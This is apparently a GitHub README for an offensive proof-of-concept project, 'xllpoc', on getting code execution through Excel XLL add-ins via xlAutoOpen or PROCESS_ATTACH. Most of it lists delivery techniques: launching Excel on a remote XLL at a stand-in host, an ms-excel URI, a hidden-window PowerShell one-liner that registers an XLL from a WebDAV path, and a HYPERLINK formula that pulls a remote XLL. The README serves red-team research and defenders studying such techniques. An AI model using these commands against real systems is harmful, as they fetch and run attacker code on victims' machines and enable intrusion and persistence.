# xllpoc
## Code Exec via Excel
A small project that aggregates community knowledge for Excel XLL execution, via xlAutoOpen() or PROCESS_ATTACH. Not a new concept.

### Credit   
- EdParcell: https://github.com/edparcell/HelloWorldXll  
- MSDN: https://msdn.microsoft.com/en-us/library/office/bb687883.aspx  
- Ryan Hanson: https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52  
- Google Groups: https://groups.google.com/forum/#!msg/exceldna/d2ogsPkv6YM/NGnSrU9tmpMJ  
- MWR Labs: https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/
- @SubTee

### Getting Exec
Put your code in either,
```
dllmain.cpp
PROCESS_ATTACH

XLL_POC.cpp
xlAutoOpen()
```
#### Some various execution techniques 
Excel
```
Excel.exe http://foo.com/xll.xll
```
uri
```
ms-excel:ofe|u|http://foo.com/xll.xll
```
Everyones favourite oneliner 
```
powershell -w hidden -c "IEX ((new-object -ComObject excel.application).RegisterXLL('\\webdavxll_poc.xll')"
```
Embedded in the Worksheet (xll cant be found)
```
=HYPERLINK("http://foo.com/xll.xll", "CLICK")
```

